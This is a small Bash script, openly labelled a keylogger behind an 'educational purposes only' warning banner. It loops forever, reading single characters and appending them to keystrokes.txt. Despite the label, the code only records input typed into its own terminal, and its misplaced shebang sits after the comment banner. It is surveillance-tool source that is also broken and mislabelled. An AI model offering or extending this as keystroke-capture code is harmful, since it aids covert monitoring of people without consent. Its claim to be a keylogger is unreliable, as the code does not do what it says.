# **************************************************
# *	    FOR EDUCATIONAL PURPOSES ONLY!	   *
# *						   *
# * 	BY DOWNLOADING AND RUNNING THIS SCRIPT     *
# * 	YOU ACKNOWLEDGE THAT THIS WILL BE USED     *
# * 	 FOR EDUCATIONAL PURPOSES AND USED ON      *
# * 	MACHINES THAT GRANTS YOU PERMISSION TO     *
# * 		  TEST THIS PROGRAM. 	           *
# *    					           *
# * 	IF YOU RUN THIS PROGRAM ON UNAUTHORIZED    *
# *      MACHINES WITHOUT THEIR CONSENT, IT IS     *
# *     UNETHICAL AND ILLEGAL. BY READING THIS,    *
# *             YOU HAVE BEEN WARNED. 	           *
# **************************************************

#!/bin/bash

# File to store the keylogs
log_file="keystrokes.txt"

# Function to log the keypresses
log_keys() {
    # Log the keypresses to the file
    while true; do
        read -n1 key
        echo -n "$key" >> "$log_file"
    done
}

# Check if the log file exists, if not, create it
if [ ! -f "$log_file" ]; then
    # Create an empty file using touch command
    touch "$log_file"
fi

# Start logging the keys
log_keys